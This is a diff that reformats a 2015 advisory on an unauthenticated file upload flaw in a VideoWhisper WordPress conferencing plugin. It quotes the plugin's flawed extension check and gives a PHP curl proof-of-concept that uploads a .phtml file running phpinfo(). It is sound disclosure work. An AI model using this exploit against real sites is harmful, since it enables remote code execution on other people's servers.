@@ -1,52 +1,78 @@
-                                                            Advisory #: 116
-Title: Remote file upload vulnerability in videowhisper-video-conference-integration wordpress plugin v4.91.8
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-03-29
-Download Site: https://wordpress.org/support/plugin/videowhisper-video-conference-integration
-Vendor:http://www.videowhisper.com/
-Vendor Notified: 2015-03-29
-Vendor Contact: http://www.videowhisper.com/tickets_submit.php
-Description: VideoWhisper Video Conference is a modern web based multiple way video chat and real time file sharing tool. Read more on
-WordPress Video Conference plugin home page.
-Vulnerability:
-*Update* You can directly execute php by uploading file extension ending in .phtml, .rhtml, .pht as long as the extension isn't defined
-in the apache mime.types. This was a previously discovered vulnerability that was not properly fixed by the author. The patch was
-insufficient in blocking malicious file uploads. ./videowhisper-video-conference-integration/vc/vw_upload.php Allows various remote
-unauthenticated file uploads, among the file types is html where the last 4 characters are only being checked in a file name to match
-which types are allowed. Because of this .shtml can be passed through and remote code execution is SSI is allowed. The code does not do
-any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site:
-.shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps The if (strstr($filename,'.php'))
-exit; can be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml <?php if ($_GET
-["room"]) $room=$_GET["room"]; if ($_POST["room"]) $room=$_POST["room"]; $filename=$_FILES['vw_file']['name']; include_once
-("incsan.php"); sanV($room); if (!$room) exit; sanV($filename); if (!$filename) exit; if (strstr($filename,'.php')) exit; //do not
-allow uploads to other folders if ( strstr($room,"/") || strstr($room,"..") ) exit; if ( strstr($filename,"/") || strstr
-($filename,"..") ) exit; $destination="uploads/".$room."/"; if ($_GET["slides"]) $destination .= "slides/"; $ext=strtolower(substr
-($filename,-4)); $allowed=array
-(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps");
-if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination . $filename); ?>loadstatus=1
-CVE-
-JSON:Export
-Exploit Code:
-   1. <?php
-   2.  
-   3. $uploadfile="upexp.phtml";
-   4. $ch =
-   5. curl_init("http://target_site/wp-content/plugins/videowhisper-video-conference-integration/vc/vw_upload.php");
-   6. curl_setopt($ch, CURLOPT_POST, true);
-   7. curl_setopt($ch, CURLOPT_POSTFIELDS,
-   8.          array('vw_file'=>"@$uploadfile",'name'=>'upexp.phtml','room'=>'.'));
-   9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  10. $postResult = curl_exec($ch);
-  11. curl_close($ch);
-  12. print "$postResult";
-  13.  
-  14. ?>
-  15.  
-  16. upexp.phtml
-  17.  
-  18. <?php
-  19. phpinfo();
-  20. ?>
-  21. The executeable should be located in wordpress/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads.
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisory.php?v=116
+
+                               Advisory #: 116
+
+   Title: Remote file upload vulnerability in
+   videowhisper-video-conference-integration wordpress plugin v4.91.8
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-03-29
+   Download Site:
+   https://wordpress.org/support/plugin/videowhisper-video-conference-inte
+   gration
+   Vendor: http://www.videowhisper.com/
+   Vendor Notified: 2015-03-29
+   Vendor Contact: http://www.videowhisper.com/tickets_submit.php
+   Description: VideoWhisper Video Conference is a modern web based
+   multiple way video chat and real time file sharing tool. Read more on
+   WordPress Video Conference plugin home page.
+   Vulnerability:
+   *Update* You can directly execute php by uploading file extension
+   ending in .phtml, .rhtml, .pht as long as the extension isn't defined
+   in the apache mime.types. This was a previously discovered
+   vulnerability that was not properly fixed by the author. The patch was
+   insufficient in blocking malicious file uploads.
+   ./videowhisper-video-conference-integration/vc/vw_upload.php Allows
+   various remote unauthenticated file uploads, among the file types is
+   html where the last 4 characters are only being checked in a file name
+   to match which types are allowed. Because of this .shtml can be passed
+   through and remote code execution is SSI is allowed. The code does not
+   do any user access validation and therefore anyone can upload the
+   following files to an unsuspecting wordpress site:
+   .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,
+   .mp3,.flv,.avi,.mpg,.ppt,.pps The if (strstr($filename,'.php')) exit;
+   can be by passed by using the extension .Php but the file extension
+   check would allow files like test.Php.shtml <?php if ($_GET["room"])
+   $room=$_GET["room"]; if ($_POST["room"]) $room=$_POST["room"];
+   $filename=$_FILES['vw_file']['name']; include_once("incsan.php");
+   sanV($room); if (!$room) exit; sanV($filename); if (!$filename) exit;
+   if (strstr($filename,'.php')) exit; //do not allow uploads to other
+   folders if ( strstr($room,"/") || strstr($room,"..") ) exit; if (
+   strstr($filename,"/") || strstr($filename,"..") ) exit;
+   $destination="uploads/".$room."/"; if ($_GET["slides"]) $destination .=
+   "slides/"; $ext=strtolower(substr($filename,-4));
+   $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",
+   ".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt","
+   .pps"); if (in_array($ext,$allowed))
+   move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination .
+   $filename); ?>loadstatus=1
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. <?php
+    2.
+    3. $uploadfile="upexp.phtml";
+    4. $ch =
+    5. curl_init("http://target_site/wp-content/plugins/videowhisper-video
+       -conference-integration/vc/vw_upload.php");
+    6. curl_setopt($ch, CURLOPT_POST, true);
+    7. curl_setopt($ch, CURLOPT_POSTFIELDS,
+    8. array('vw_file'=>"@$uploadfile",'name'=>'upexp.phtml','room'=>'.'))
+       ;
+    9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   10. $postResult = curl_exec($ch);
+   11. curl_close($ch);
+   12. print "$postResult";
+   13.
+   14. ?>
+   15.
+   16. upexp.phtml
+   17.
+   18. <?php
+   19. phpinfo();
+   20. ?>
+   21. The executeable should be located in
+       wordpress/wp-content/plugins/videowhisper-video-conference-integrat
+       ion/vc/uploads.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisory.php?v=116
